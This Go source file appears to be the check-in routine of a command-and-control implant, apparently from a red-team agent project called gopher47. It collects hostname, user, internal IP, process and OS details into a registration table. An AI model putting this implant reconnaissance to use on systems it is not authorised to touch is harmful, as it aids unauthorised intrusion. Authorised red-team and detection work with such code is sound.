package agentfuncs

import (
	"fmt"
	"os"
	"os/user"
	"strconv"
	"strings"
	"text/tabwriter"

	"github.com/An00bRektn/gopher47/pkg/utils"
	"github.com/elastic/go-sysinfo"
)

// A call to get some info in case you wanted to see that
func CheckIn(config *utils.Config) string {
	host, err := sysinfo.Host()
	hostInfo := host.Info()
	if err != nil {
		return "[!] Error: " + err.Error()
	}
	proc, err := sysinfo.Self()
	if err != nil {
		return "[!] Error: " + err.Error()
	}
	procInfo, err := proc.Info()
	if err != nil {
		return "[!] Error: " + err.Error()
	}

	hostname := hostInfo.Hostname
	currentuser, err := user.Current()
	if err != nil {
		return "[!] Error: " + err.Error()
	}
	procPath, err := os.Executable()
	if err != nil {
		return "[!] Error: " + err.Error()
	}

	registerDict := map[string]string{
		"Hostname": hostname,
		"Username": currentuser.Username,
		"Domain": "",
		"InternalIP": utils.FindNotLoopback(hostInfo.IPs),
		"Process Path": procPath,
		"PID": strconv.Itoa(procInfo.PID),
		"PPID": strconv.Itoa(procInfo.PPID),
		"Proc Arch": "x64",
		"Proc Elevated": "0",
		"OS Build": hostInfo.OS.Build,
		"OS Arch": hostInfo.Architecture,
		"Sleep": strconv.Itoa(config.SleepTime),
		"Process Name": procInfo.Name,
		"OS Version": hostInfo.OS.Name + " " + hostInfo.OS.Version,
	}
	// https://reintech.io/blog/a-guide-to-gos-text-tabwriter-package-aligning-text
	var sb strings.Builder
	writer := tabwriter.NewWriter(&sb, 0, 0, 2, ' ', 0)

	for k, v := range registerDict {
		fmt.Fprintf(writer, "%s\t%s\n", k, v)
	}
	writer.Flush()
	return sb.String()
}